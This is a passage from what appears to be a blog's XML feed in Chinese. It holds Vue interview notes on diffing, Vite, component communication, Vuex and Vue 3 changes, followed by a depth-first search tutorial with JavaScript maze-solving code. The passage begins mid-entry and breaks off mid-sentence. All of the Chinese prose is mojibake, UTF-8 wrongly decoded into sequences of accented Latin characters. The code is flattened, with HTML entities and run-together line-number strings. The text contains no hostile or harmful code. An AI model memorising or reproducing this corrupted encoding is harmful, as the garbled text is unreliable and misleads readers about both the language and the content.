åˆ¤æ–­æ˜¯å¦å¤ç”¨èŠ‚ç‚¹ï¼škeyã€tagã€æ˜¯å¦æœ‰ data å­˜åœ¨ã€æ˜¯å¦æ˜¯æ³¨é‡ŠèŠ‚ç‚¹ã€æ˜¯å¦æ˜¯ç›¸åŒçš„ input typeï¼› é€šè¿‡å¤´å°¾æŒ‡é’ˆå†…éƒ¨æ”¶ç¼©ç®—æ³•æ¥æ¯”è¾ƒåŒçº§èŠ‚ç‚¹æ˜¯å¦æ˜¯ sameNodeï¼› ç”¨ index ä½œä¸º keyï¼Œå½“åˆ—è¡¨æ•°æ®ç¬¬ä¸€ä½åˆ é™¤åŽ ï¼Œåœ¨å¯¹åº”çš„æ–° VNode ä¸­èŠ‚ç‚¹çš„ key ä¹Ÿæ›´æ–°ï¼Œåœ¨ patchVNode æ—¶ï¼Œä¼šå¤ç”¨åŽŸæ¥çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç¬¬äºŒä¸ªèŠ‚ç‚¹â€¦å‘çŽ°æ–°èŠ‚ç‚¹é‡Œå°‘äº†ä¸€ä¸ªå°±ä¼šåˆ é™¤ã€‚è¿™æ ·å°†åŽŸæœ¬åˆ é™¤ç¬¬ä¸€ä½èŠ‚ç‚¹å˜æˆäº†åˆ é™¤æœ€åŽä¸€ä½èŠ‚ç‚¹ï¼Œå…¶ä»–èŠ‚ç‚¹å¤ç”¨ä¹Ÿé”™äº†ã€‚ vite çš„è®¤è¯†ä¼˜ç‚¹ï¼š é‡‡ç”¨ ESBuild ä½¿ç”¨ go ç¼–å†™ï¼Œé¢„æž„å»ºä¾èµ–ï¼Œæ¯” Javascript ç¼–å†™çš„æ‰“åŒ…å™¨é¢„æž„å»ºä¾èµ–å¿« 10-100 å€ï¼› é¢„ç¼–è¯‘ï¼šnpm ä¾èµ–åŸºæœ¬ä¸ä¼šå˜åŒ–çš„æ¨¡å—ï¼Œåœ¨é¢„æž„å»ºé˜¶æ®µæ•´ç†ï¼Œå‡å°‘ http è¯·æ±‚æ•°ï¼› æŒ‰éœ€ç¼–è¯‘ï¼šç”¨æˆ·æºç éœ€é¢‘ç¹å˜åŠ¨çš„æ¨¡å—ï¼Œæ ¹æ®è·¯ç”±ä½¿ç”¨å®žæ—¶ç¼–è¯‘ï¼› å®¢æˆ·ç«¯å¼ºç¼“å­˜ï¼šè¯·æ±‚è¿‡çš„æ¨¡å—å“åº”å¤´ max-age=31536000ï¼Œimmutable å¼ºç¼“å­˜ï¼Œå¦‚æžœç‰ˆæœ¬æ¨¡å—å‘ç”Ÿå˜åŒ–åˆ™ç”¨é™„åŠ ç‰ˆæœ¬ query ä½¿å…¶å¤±æ•ˆï¼› äº§ç‰©ä¼˜åŒ–ï¼šæ²¡æœ‰ runtime å’Œæ¨¡ç‰ˆä»£ç ï¼› åˆ†åŒ…å¤„ç†ï¼šä¸éœ€è¦ç”¨æˆ·å¹²é¢„ï¼Œé»˜è®¤å¯åŠ¨ä¸€ç³»åˆ—æ™ºèƒ½åˆ†åŒ…è§„åˆ™ï¼Œå°½é‡å‡å°‘æ¨¡å—çš„é‡å¤æ‰“åŒ…ï¼Œtree-shakingï¼ŒæŒ‰éœ€æ‰“åŒ…ï¼Œå…¬å…±ä¾èµ–å½“ä½œç‹¬ç«‹ chunkï¼› é™æ€èµ„æºå¤„ç†ï¼šæä¾›äº† URLï¼Œå­—ç¬¦ä¸²ï¼Œmoduleï¼Œassemblyï¼Œworker ç­‰å¤„ç†æ–¹å¼ï¼› ç¼ºç‚¹ï¼š ES module åªå…¼å®¹çŽ°ä»£æµè§ˆå™¨ï¼› Rollup æ‰“åŒ…ï¼Œè€Œä¸æ˜¯ ESBuildï¼ŒåŽŸå› åœ¨äºŽæž„å»ºåº”ç”¨é‡è¦åŠŸèƒ½è¿˜åœ¨æŒç»­å¼€å‘ä¸­ï¼Œç‰¹åˆ«æ˜¯ä»£ç åˆ†å‰²å’Œ CSS å¤„ç†æ–¹é¢ã€‚ Vue ç»„ä»¶é€šè®¯æ–¹å¼ props å’Œ $emit çˆ¶ç»„ä»¶å‘å­ç»„ä»¶ä¼ é€’æ•°æ®æ˜¯é€šè¿‡ prop ä¼ é€’çš„ï¼Œå­ç»„ä»¶ä¼ é€’æ•°æ®ç»™çˆ¶ç»„ä»¶æ˜¯é€šè¿‡ $emit è§¦å‘äº‹ä»¶æ¥åšåˆ°çš„ï¼› $parentï¼Œ$children èŽ·å–å½“å‰ç»„ä»¶çš„çˆ¶ç»„ä»¶å’Œå½“å‰ç»„ä»¶çš„å­ç»„ä»¶ï¼› $arrts å’Œ $listeners è§£å†³äº†å°†çˆ¶ç»„ä»¶å±žæ€§å’Œç›‘å¬å™¨ä¼ é€’åˆ°å†…éƒ¨ç»„ä»¶ï¼› eventBus äº‹ä»¶æ€»çº¿æ–¹å¼ï¼› vuex çŠ¶æ€ç®¡ç†ï¼› Vuex åŽŸç†Vuex æ˜¯åŸºäºŽ Vue å®žçŽ°çš„å…¨å±€çŠ¶æ€ç®¡ç†å™¨æ’ä»¶ï¼Œåˆ©ç”¨ Vue çš„å“åº”å¼åŽŸç†ç›‘å¬ state å¯¹è±¡çš„å˜åŒ–ï¼Œå†é€šè¿‡å…¨å±€ Vue.mixin API åœ¨æ¯ä¸ªç»„ä»¶çš„ beforeCreate ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œæ—¶å°† store å¯¹è±¡æ³¨å…¥åˆ°ç»„ä»¶ã€‚ å‚è€ƒ ã€ŒVue æºç å­¦ä¹ ã€ä½ æƒ³çŸ¥é“ Vuex çš„å®žçŽ°åŽŸç†å—ï¼Ÿ Vue3 VS Vue2 çš„æ”¹å˜ä»Žä½¿ç”¨ä¸Šæ¥çœ‹ composition APIã€‚ç”± optionsï¼ˆé€‰é¡¹å¼ï¼‰API å˜æˆ compositionï¼ˆç»„åˆå¼ï¼‰APIï¼Œè¿™ç§æ”¹å˜å¸¦æ¥çš„ï¼š é˜²æ­¢ä»£ç é€»è¾‘åˆ†æ•£åœ¨é€‰é¡¹å¼ API çš„ä¸åŒä½ç½® propsã€dataã€methods ç­‰ï¼Œç»„åˆå¼ API ä¼šé›†ä¸­åœ¨ä¸€èµ·ï¼› è§£å†³ Mixinsã€é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰å’Œ Renderless Componentsï¼ˆä½œç”¨äºŽæ’æ§½å°è£…é€»è¾‘çš„ç»„ä»¶ï¼‰å¸¦æ¥çš„é€»è¾‘å¤ç”¨å­˜åœ¨çš„é—®é¢˜ã€‚ setup ç”Ÿå‘½å‘¨æœŸé’©å­ã€‚Vue3 çš„ç»„åˆå¼ API ä»£ç é€»è¾‘åœ¨ setup é‡Œæ‰§è¡Œï¼ŒåŒæ—¶ï¼Œ&lt;script setup&gt; ä½œä¸º setup åœ¨å•æ–‡ä»¶ç»„ä»¶ä½¿ç”¨ç»„åˆå¼ API ç¼–è¯‘æ—¶çš„è¯­æ³•ç³–ï¼Œè¿›ä¸€æ­¥ç®€åŒ–äº†ä»£ç ï¼Œæ›´å¥½çš„ IDE ç±»åž‹æŽ¨æ–­æ€§èƒ½ï¼Œé¡¶å±‚çš„ç»‘å®šï¼ˆå˜é‡ã€å‡½æ•°å£°æ˜Žå’Œ import å¼•å…¥å†…å®¹ï¼‰èƒ½åœ¨æ¨¡ç‰ˆä¸­ç›´æŽ¥ä½¿ç”¨ï¼› defineAsyncComponent åŒ…è£…å¼‚æ­¥ç»„ä»¶ï¼›ç‰‡æ®µï¼Œç»„ä»¶æ”¯æŒå¤šä¸ªæ ¹èŠ‚ç‚¹ï¼› åºŸé™¤äº†.nativeä¿®é¥°ç¬¦ï¼Œç”¨ emits é€‰é¡¹å®šä¹‰ç»„ä»¶å¯è§¦å‘çš„äº‹ä»¶ï¼› æ–°å¢ž Suspense å’Œ Teleport å†…ç½®ç»„ä»¶ï¼› åºŸé™¤äº† $listeners å’Œ $children å±žæ€§ï¼› é€šè¿‡ defineExpose ç¼–è¯‘å®æš´éœ²å‡ºåŽ»å±žæ€§ç»™ ref ä½¿ç”¨ï¼› è‡ªå®šä¹‰ hooksã€‚å€ŸåŠ© React hooks æ€æƒ³ï¼Œå¯åŸºäºŽå‡½æ•°æŠ½å–å’Œå¤ç”¨é€»è¾‘çš„èƒ½åŠ›ï¼› ä»Žå†…éƒ¨æ”¹è¿›æ¥çœ‹ ç±»åž‹æŽ¨å¯¼ã€‚ å°† JavaScript æ”¹æˆäº† typescriptï¼Œå…·æœ‰å‹å¥½çš„ç±»åž‹æŽ¨å¯¼å’Œ IDE è¯­æ³•è¡¥å…¨ï¼› æ‰“åŒ…å°ºå¯¸ã€‚ åŸºäºŽå‡½æ•°çš„ API æ¯ä¸ªå‡½æ•°éƒ½å¯ä»¥ä½œä¸ºå…·å ES module export è¢«å•ç‹¬å¼•å…¥ï¼Œå¯¹ tree-shaking éžå¸¸å‹å¥½ã€‚åŸºäºŽå‡½æ•° API æ‰€å†™çš„ä»£ç åŽ‹ç¼©çŽ‡æ›´å¥½ï¼Œå› ä¸ºå‡½æ•°åå’Œ setup å‡½æ•°ä½“å†…éƒ¨çš„å˜é‡éƒ½å¯ä»¥è¢«åŽ‹ç¼©ï¼Œä½†å¯¹è±¡å’Œ class å±žæ€§/æ–¹æ³•ä¸å¯ä»¥ï¼› æ€§èƒ½æ›´ä¼˜ã€‚é‡å†™äº†è™šæ‹Ÿ DOM çš„å®žçŽ°ï¼Œç¼–è¯‘æ¨¡ç‰ˆçš„ä¼˜åŒ–ã€‚ ç¼–è¯‘æ¨¡ç‰ˆçš„ä¼˜åŒ–ã€‚ç¼–è¯‘æ¨¡ç‰ˆåˆ†ä¸º 3 ä¸ªé˜¶æ®µï¼Œåˆ†åˆ«æ˜¯ï¼šparseã€transform å’Œ codegenã€‚å…¶ä¸­ parse é˜¶æ®µå°†æ¨¡ç‰ˆå­—ç¬¦ä¸²è½¬åŒ–ä¸ºæŠ½è±¡è¯­æ³•æ ‘ ASTï¼›transform é˜¶æ®µåˆ™æ˜¯å¯¹ AST è¿›è¡Œäº†ä¸€äº›è½¬æ¢å¤„ç†ï¼›codegen é˜¶æ®µæ ¹æ® AST ç”Ÿæˆå¯¹åº”çš„ render å‡½æ•°å­—ç¬¦ä¸²ã€‚ é™æ€èŠ‚ç‚¹æå‡ã€‚åœ¨ transform é˜¶æ®µï¼Œä¼šæ‰“ä¸Š PatchFlag æ ‡è®°ï¼Œæœ‰è¿™ä¸ªæ ‡å¿—æˆ–è€…å¤§äºŽ 0 è¡¨ç¤ºè¦æ›´æ–°ï¼Œå¦åˆ™è·³è¿‡ï¼Œåº”ç”¨åœ¨ diff æ¯”è¾ƒè¿‡ç¨‹ã€‚-1 ä»£è¡¨é™æ€èŠ‚ç‚¹ï¼Œæ— è®ºå±‚çº§åµŒå¥—å¤šæ·±ï¼Œé™æ€èŠ‚ç‚¹ä¼šè¢«æå‡åˆ° render()å‡½æ•°å¤–é¢ï¼Œå®ƒçš„åŠ¨æ€èŠ‚ç‚¹éƒ½ç›´æŽ¥ä¸Ž block æ ¹èŠ‚ç‚¹ç»‘å®šï¼Œæ— éœ€å†åŽ»éåŽ†é™æ€èŠ‚ç‚¹ã€‚å‚è€ƒVue3 æ¨¡ç‰ˆç¼–è¯‘åŽŸç† äº‹ä»¶ç¼“å­˜ï¼šcacheHandleï¼Œæ¯”å¦‚ç»‘å®šä¸€ä¸ª onclick äº‹ä»¶ï¼Œä¼šè¢«è§†ä¸º PROPS åŠ¨æ€ç»‘å®šï¼ŒåŽåºæ›¿æ¢ç‚¹å‡»äº‹ä»¶æ—¶éœ€è¦è¿›è¡Œæ›´æ–°ï¼Œcache[1] è‡ªåŠ¨ç”Ÿæˆå¹¶ç¼“å­˜ä¸€ä¸ªå†…è”å‡½æ•°ï¼Œâ€œç¥žå¥‡â€çš„å˜ä¸ºäº†ä¸€ä¸ªé™æ€èŠ‚ç‚¹ã€‚Psï¼šç›¸å½“äºŽ React ä¸­ useCallback è‡ªåŠ¨åŒ–ã€‚ è‡ªå®šä¹‰æ¸²æŸ“å™¨ï¼Œç”¨æˆ·å¯ä»¥å°è¯• WebGL è‡ªå®šä¹‰æ¸²æŸ“å™¨ã€‚]]></content>
      <tags>
        <tag>interview</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ã€Œè¶…è¯¦ç¬”è®°ã€ç®—æ³•â€”â€”æ·±åº¦ä¸Žå¹¿åº¦ä¼˜å…ˆï¼ˆJSç‰ˆï¼‰]]></title>
    <url>%2F2020%2F11%2F08%2Falgorithm-dfs-bfs%2F</url>
    <content type="text"><![CDATA[æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDepth-First Search / DFSï¼‰æ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œä»Žèµ·ç‚¹å‡ºå‘ï¼Œä»Žè§„å®šçš„æ–¹å‘ä¸­é€‰æ‹©å…¶ä¸­ä¸€ä¸ªä¸æ–­åœ°å‘å‰èµ°ï¼Œç›´åˆ°æ— æ³•ç»§ç»­ä¸ºæ­¢ï¼Œç„¶åŽå°è¯•å¦å¤–ä¸€ç§æ–¹å‘ï¼Œç›´åˆ°æœ€åŽèµ°åˆ°ç»ˆç‚¹ã€‚å°±åƒèµ°è¿·å®«ä¸€æ ·ï¼Œå°½é‡å¾€æ·±å¤„èµ°ã€‚ DFS è§£å†³çš„æ˜¯è¿žé€šæ€§çš„é—®é¢˜ï¼Œå³ï¼Œç»™å®šä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯èµ·å§‹ç‚¹ï¼Œä¸€ä¸ªæ˜¯ç»ˆç‚¹ï¼Œåˆ¤æ–­æ˜¯ä¸æ˜¯æœ‰ä¸€æ¡è·¯å¾„èƒ½ä»Žèµ·ç‚¹è¿žæŽ¥åˆ°ç»ˆç‚¹ã€‚èµ·ç‚¹å’Œç»ˆç‚¹ï¼Œä¹Ÿå¯ä»¥æŒ‡çš„æ˜¯æŸç§èµ·å§‹çŠ¶æ€å’Œæœ€ç»ˆçš„çŠ¶æ€ã€‚é—®é¢˜çš„è¦æ±‚å¹¶ä¸åœ¨ä¹Žè·¯å¾„æ˜¯é•¿è¿˜æ˜¯çŸ­ï¼Œåªåœ¨ä¹Žæœ‰è¿˜æ˜¯æ²¡æœ‰ã€‚æœ‰æ—¶å€™é¢˜ç›®ä¹Ÿä¼šè¦æ±‚æŠŠæ‰¾åˆ°çš„è·¯å¾„å®Œæ•´çš„æ‰“å°å‡ºæ¥ã€‚ DFS éåŽ†ä¾‹é¢˜ï¼šå‡è®¾æˆ‘ä»¬æœ‰è¿™ä¹ˆä¸€ä¸ªå›¾ï¼Œé‡Œé¢æœ‰ Aã€Bã€Cã€Dã€Eã€Fã€Gã€H 8 ä¸ªé¡¶ç‚¹ï¼Œç‚¹å’Œç‚¹ä¹‹é—´çš„è”ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹è¿™ä¸ªå›¾è¿›è¡Œæ·±åº¦ä¼˜å…ˆçš„éåŽ†ã€‚ DFS éåŽ†è§£é¢˜æ€è·¯å¿…é¡»ä¾èµ–æ ˆï¼ˆStackï¼‰ï¼Œç‰¹ç‚¹æ˜¯åŽè¿›å…ˆå‡ºï¼ˆLIFOï¼‰ã€‚ ç¬¬ä¸€æ­¥ï¼Œé€‰æ‹©ä¸€ä¸ªèµ·å§‹é¡¶ç‚¹ï¼Œä¾‹å¦‚ä»Žé¡¶ç‚¹ A å¼€å§‹ã€‚æŠŠ A åŽ‹å…¥æ ˆï¼Œæ ‡è®°å®ƒä¸ºè®¿é—®è¿‡ï¼ˆç”¨çº¢è‰²æ ‡è®°ï¼‰ï¼Œå¹¶è¾“å‡ºåˆ°ç»“æžœä¸­ã€‚ ç¬¬äºŒæ­¥ï¼Œå¯»æ‰¾ä¸Ž A ç›¸è¿žå¹¶ä¸”è¿˜æ²¡æœ‰è¢«è®¿é—®è¿‡çš„é¡¶ç‚¹ï¼Œé¡¶ç‚¹ A ä¸Ž Bã€Dã€G ç›¸è¿žï¼Œè€Œä¸”å®ƒä»¬éƒ½è¿˜æ²¡æœ‰è¢«è®¿é—®è¿‡ï¼Œæˆ‘ä»¬æŒ‰ç…§å­—æ¯é¡ºåºå¤„ç†ï¼Œæ‰€ä»¥å°† B åŽ‹å…¥æ ˆï¼Œæ ‡è®°å®ƒä¸ºè®¿é—®è¿‡ï¼Œå¹¶è¾“å‡ºåˆ°ç»“æžœä¸­ã€‚ ç¬¬ä¸‰æ­¥ï¼ŒçŽ°åœ¨æˆ‘ä»¬åœ¨é¡¶ç‚¹ B ä¸Šï¼Œé‡å¤ä¸Šé¢çš„æ“ä½œï¼Œç”±äºŽ B ä¸Ž Aã€Eã€F ç›¸è¿žï¼Œå¦‚æžœæŒ‰ç…§å­—æ¯é¡ºåºå¤„ç†çš„è¯ï¼ŒA åº”è¯¥æ˜¯è¦è¢«è®¿é—®çš„ï¼Œä½†æ˜¯ A å·²ç»è¢«è®¿é—®äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¿é—®é¡¶ç‚¹ Eï¼Œå°† E åŽ‹å…¥æ ˆï¼Œæ ‡è®°å®ƒä¸ºè®¿é—®è¿‡ï¼Œå¹¶è¾“å‡ºåˆ°ç»“æžœä¸­ã€‚ ç¬¬å››æ­¥ï¼Œä»Ž E å¼€å§‹ï¼ŒE ä¸Ž Bã€G ç›¸è¿žï¼Œä½†æ˜¯ B åˆšåˆšè¢«è®¿é—®è¿‡äº†ï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ªè¢«è®¿é—®çš„å°†æ˜¯ Gï¼ŒæŠŠ G åŽ‹å…¥æ ˆï¼Œæ ‡è®°å®ƒä¸ºè®¿é—®è¿‡ï¼Œå¹¶è¾“å‡ºåˆ°ç»“æžœä¸­ã€‚ ç¬¬äº”æ­¥ï¼ŒçŽ°åœ¨æˆ‘ä»¬åœ¨é¡¶ç‚¹ G çš„ä½ç½®ï¼Œç”±äºŽä¸Ž G ç›¸è¿žçš„é¡¶ç‚¹éƒ½è¢«è®¿é—®è¿‡äº†ï¼Œç±»ä¼¼äºŽæˆ‘ä»¬èµ°åˆ°äº†ä¸€ä¸ªæ­»èƒ¡åŒï¼Œå¿…é¡»å°è¯•å…¶ä»–çš„è·¯å£äº†ã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œè¦åšçš„å°±æ˜¯ç®€å•åœ°å°† G ä»Žæ ˆé‡Œå¼¹å‡ºï¼Œè¡¨ç¤ºæˆ‘ä»¬ä»Ž G è¿™é‡Œå·²ç»æ— æ³•ç»§ç»­èµ°ä¸‹åŽ»äº†ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ä»Žå‰ä¸€ä¸ªè·¯å£æ‰¾åˆ°å‡ºè·¯ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œæ¯æ¬¡æˆ‘ä»¬åœ¨è€ƒè™‘ä¸‹ä¸€ä¸ªè¦è¢«è®¿é—®çš„ç‚¹æ˜¯ä»€ä¹ˆçš„æ—¶å€™ï¼Œå¦‚æžœå‘çŽ°å‘¨å›´çš„é¡¶ç‚¹éƒ½è¢«è®¿é—®äº†ï¼Œå°±æŠŠå½“å‰çš„é¡¶ç‚¹å¼¹å‡ºã€‚ ç¬¬å…­æ­¥ï¼ŒçŽ°åœ¨æ ˆçš„é¡¶éƒ¨è®°å½•çš„æ˜¯é¡¶ç‚¹ Eï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸Ž E ç›¸è¿žçš„é¡¶ç‚¹ä¸­æœ‰æ²¡æœ‰è¿˜æ²¡è¢«è®¿é—®åˆ°çš„ï¼Œå‘çŽ°å®ƒä»¬éƒ½è¢«è®¿é—®äº†ï¼Œæ‰€ä»¥æŠŠ E ä¹Ÿå¼¹å‡ºåŽ»ã€‚ ç¬¬ä¸ƒæ­¥ï¼Œå½“å‰æ ˆçš„é¡¶ç‚¹æ˜¯ Bï¼Œçœ‹çœ‹å®ƒå‘¨å›´æœ‰æ²¡æœ‰è¿˜æ²¡è¢«è®¿é—®çš„é¡¶ç‚¹ï¼Œæœ‰ï¼Œæ˜¯é¡¶ç‚¹ Fï¼ŒäºŽæ˜¯æŠŠ F åŽ‹å…¥æ ˆï¼Œæ ‡è®°å®ƒä¸ºè®¿é—®è¿‡ï¼Œå¹¶è¾“å‡ºåˆ°ç»“æžœä¸­ã€‚ ç¬¬å…«æ­¥ï¼Œå½“å‰é¡¶ç‚¹æ˜¯ Fï¼Œä¸Ž F ç›¸è¿žå¹¶ä¸”è¿˜æœªè¢«è®¿é—®åˆ°çš„ç‚¹æ˜¯ C å’Œ Dï¼ŒæŒ‰ç…§å­—æ¯é¡ºåºæ¥ï¼Œä¸‹ä¸€ä¸ªè¢«è®¿é—®çš„ç‚¹æ˜¯ Cï¼Œå°† C åŽ‹å…¥æ ˆï¼Œæ ‡è®°ä¸ºè®¿é—®è¿‡ï¼Œè¾“å‡ºåˆ°ç»“æžœä¸­ã€‚ ç¬¬ä¹æ­¥ï¼Œå½“å‰é¡¶ç‚¹ä¸º Cï¼Œä¸Ž C ç›¸è¿žå¹¶å°šæœªè¢«è®¿é—®åˆ°çš„é¡¶ç‚¹æ˜¯ Hï¼Œå°† H åŽ‹å…¥æ ˆï¼Œæ ‡è®°ä¸ºè®¿é—®è¿‡ï¼Œè¾“å‡ºåˆ°ç»“æžœä¸­ã€‚ ç¬¬åæ­¥ï¼Œå½“å‰é¡¶ç‚¹æ˜¯ Hï¼Œç”±äºŽå’Œå®ƒç›¸è¿žçš„ç‚¹éƒ½è¢«è®¿é—®è¿‡äº†ï¼Œå°†å®ƒå¼¹å‡ºæ ˆã€‚ ç¬¬åä¸€æ­¥ï¼Œå½“å‰é¡¶ç‚¹æ˜¯ Cï¼Œä¸Ž C ç›¸è¿žçš„ç‚¹éƒ½è¢«è®¿é—®è¿‡äº†ï¼Œå°† C å¼¹å‡ºæ ˆã€‚ ç¬¬åäºŒæ­¥ï¼Œå½“å‰é¡¶ç‚¹æ˜¯ Fï¼Œä¸Ž F ç›¸è¿žçš„å¹¶ä¸”å°šæœªè®¿é—®çš„ç‚¹æ˜¯ Dï¼Œå°† D åŽ‹å…¥æ ˆï¼Œè¾“å‡ºåˆ°ç»“æžœä¸­ï¼Œå¹¶æ ‡è®°ä¸ºè®¿é—®è¿‡ã€‚ ç¬¬åä¸‰æ­¥ï¼Œå½“å‰é¡¶ç‚¹æ˜¯ Dï¼Œä¸Žå®ƒç›¸è¿žçš„ç‚¹éƒ½è¢«è®¿é—®è¿‡äº†ï¼Œå°†å®ƒå¼¹å‡ºæ ˆã€‚ä»¥æ­¤ç±»æŽ¨ï¼Œé¡¶ç‚¹ Fï¼ŒBï¼ŒA çš„é‚»å±…éƒ½è¢«è®¿é—®è¿‡äº†ï¼Œå°†å®ƒä»¬ä¾æ¬¡å¼¹å‡ºæ ˆå°±å¥½äº†ã€‚æœ€åŽï¼Œå½“æ ˆé‡Œå·²ç»æ²¡æœ‰é¡¶ç‚¹éœ€è¦å¤„ç†äº†ï¼Œæˆ‘ä»¬çš„æ•´ä¸ªéåŽ†ç»“æŸã€‚ èµ°è¿·å®«é—®é¢˜ç»™å®šä¸€ä¸ªäºŒç»´çŸ©é˜µä»£è¡¨ä¸€ä¸ªè¿·å®«ï¼Œè¿·å®«é‡Œé¢æœ‰é€šé“ï¼Œä¹Ÿæœ‰å¢™å£ï¼Œé€šé“ç”±æ•°å­— 0 è¡¨ç¤ºï¼Œè€Œå¢™å£ç”± -1 è¡¨ç¤ºï¼Œæœ‰å¢™å£çš„åœ°æ–¹ä¸èƒ½é€šè¿‡ï¼Œé‚£ä¹ˆï¼Œèƒ½ä¸èƒ½ä»Ž A ç‚¹èµ°åˆ° B ç‚¹ã€‚ ä»Ž A å¼€å§‹èµ°çš„è¯ï¼Œæœ‰å¾ˆå¤šæ¡è·¯å¾„é€šå¾€ Bï¼Œä¾‹å¦‚ä¸‹é¢ä¸¤ç§ã€‚ èµ°è¿·å®«é—®é¢˜ä»£ç å®žçŽ°é€’å½’æ–¹å¼å®žçŽ° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// è¿·å®«ï¼šä»Žèµ·ç‚¹åˆ°è¾¾è®¾å®šç»ˆç‚¹ï¼Œè¦æ±‚ç»•è¿‡ä¸­é—´è®¾ç½®çš„éšœç¢// é€šè¿‡é€’å½’çš„æ–¹å¼å®žçŽ°// ç›®æ ‡ç‚¹const target = [4, 2]// æ°´å¹³æ–¹å‘åç§»é‡const dx = function (d) &#123; switch (d) &#123; case 0: return 1 case 1: return 0 case 2: return -1 case 3: return 0 &#125;&#125;// ç«–ç›´æ–¹å‘åç§»é‡const dy = function (d) &#123; switch (d) &#123; case 0: return 0 case 1: return 1 case 2: return 0 case 3: return -1 &#125;&#125;// æ˜¯å¦åœ¨å®‰å…¨èŒƒå›´ï¼šæœªè¶…ç•Œå¹¶ä¸”ä¸åœ¨éšœç¢ä¸Šconst isSafe = function (maze, i, j) &#123; return i &gt;= 0 &amp;&amp; i &lt; maze.length &amp;&amp; j &gt;= 0 &amp;&amp; j &lt; maze[0].length &amp;&amp; maze[i][j] !== -1&#125;const dfs = function (maze, x, y) &#123; // ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­æ˜¯å¦æ‰¾åˆ°B if (x === target[0] &amp;&amp; y === target[1]) &#123; return true &#125; // ç¬¬äºŒæ­¥ï¼šæ ‡è®°å½“å‰çš„ç‚¹å·²ç»è¢«è®¿é—®è¿‡ maze[x][y] = -1 // ç¬¬ä¸‰æ­¥ï¼šåœ¨å››ä¸ªæ–¹å‘ä¸Šå°è¯• for (let d = 0; d &lt; 4; d++) &#123; let i = x + dx(d) let j = y + dy(d) // ç¬¬å››æ­¥ï¼šå¦‚æžœæœ‰ä¸€æ¡è·¯å¾„è¢«æ‰¾åˆ°äº†ï¼Œè¿”å›žtrue if (isSafe(maze, i, j) &amp;&amp; dfs(maze, i, j)) &#123; return true &#125; &#125; return false&#125;const maze = [ [0, 0, 0, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, -1, 0, 0, 0, 0], [0, 0, 0, 0, 0, -1]]console.log('dfs: ', dfs(maze, 0, 3)) // dfs: true éžé€’å½’æ–¹å¼å®žçŽ° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// éžé€’å½’æ–¹å¼å®žçŽ°// ç›®æ ‡ç‚¹const target = [4, 2]// æ°´å¹³æ–¹å‘åç§»é‡const dx = function (d) &#123; switch (d) &#123; case 0: return 1 case 1: return 0 case 2: return -1 case 3: return 0 &#125;&#125;// ç«–ç›´æ–¹å‘åç§»é‡const dy = function (d) &#123; switch (d) &#123; case 0: return 0 case 1: return 1 case 2: return 0 case 3: return -1 &#125;&#125;// æ˜¯å¦åœ¨å®‰å…¨èŒƒå›´ï¼šæœªè¶…ç•Œå¹¶ä¸”ä¸åœ¨éšœç¢ä¸Šconst isSafe = function (maze, i, j) &#123; return i &gt;= 0 &amp;&amp; i &lt; maze.length &amp;&amp; j &gt;= 0 &amp;&amp; j &lt; maze[0].length &amp;&amp; maze[i][j] !== -1&#125;const dfs = function (maze, x, y) &#123; // åˆ›å»ºä¸€ä¸ª Stack const stack = [] // å°†èµ·å§‹ç‚¹åŽ‹å…¥æ ˆï¼Œæ ‡è®°å®ƒè®¿é—®è¿‡ stack.push([x, y]) maze[x][y] = -1 while (stack.length) &#123; // å–å‡ºå½“å‰ç‚¹ const pos = stack.pop() x = pos[0] y = pos[1] // åˆ¤æ–­æ˜¯å¦æ‰¾åˆ°äº†ç›®çš„åœ° if (x === target[0] &amp;&amp; y === target[1]) &#123; return true &#125; // åœ¨å››ä¸ªæ–¹å‘ä¸Šå°è¯• for (let d = 0; d &lt; 4; d++) &#123; let i = x + dx(d) let j = y + dy(d) if (isSafe(maze, i, j)) &#123; stack.push([i, j]) maze[i][j] = -1 &#125; &#125; &#125; return false&#125;const maze = [ [0, 0, 0, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, -1, 0, 0, 0, 0], [0, 0, 0, 0, 0, -1]]console.log('dfs: ', dfs(maze, 0, 3)) é€’å½’å®žçŽ°ï¼š ä»£ç çœ‹ä¸ŠåŽ»å¾ˆç®€æ´ï¼› å®žé™…åº”ç”¨ä¸­ï¼Œé€’å½’éœ€è¦åŽ‹å…¥å’Œå¼¹å‡ºæ ˆï¼Œæ ˆæ·±çš„æ—¶å€™ä¼šé€ æˆè¿è¡Œæ•ˆçŽ‡ä½Žä¸‹ã€‚ éžé€’å½’å®žçŽ°ï¼š æ ˆæ”¯æŒåŽ‹å…¥å’Œå¼¹å‡ºï¼› æ ˆèƒ½æé«˜æ•ˆçŽ‡ã€‚ DFS ç®—æ³•åˆ†æžDFS æ˜¯å›¾è®ºé‡Œçš„ç®—æ³•ï¼Œåˆ†æžåˆ©ç”¨ DFS è§£é¢˜çš„å¤æ‚åº¦æ—¶ï¼Œåº”å½“å€Ÿç”¨å›¾è®ºçš„æ€æƒ³ã€‚å›¾æœ‰ä¸¤ç§è¡¨ç¤ºæ–¹å¼ï¼šé‚»æŽ¥è¡¨ã€é‚»æŽ¥çŸ©é˜µã€‚å‡è®¾å›¾é‡Œæœ‰ V ä¸ªé¡¶ç‚¹ï¼ŒE æ¡è¾¹ã€‚ æ—¶é—´å¤æ‚åº¦ï¼š é‚»æŽ¥è¡¨ 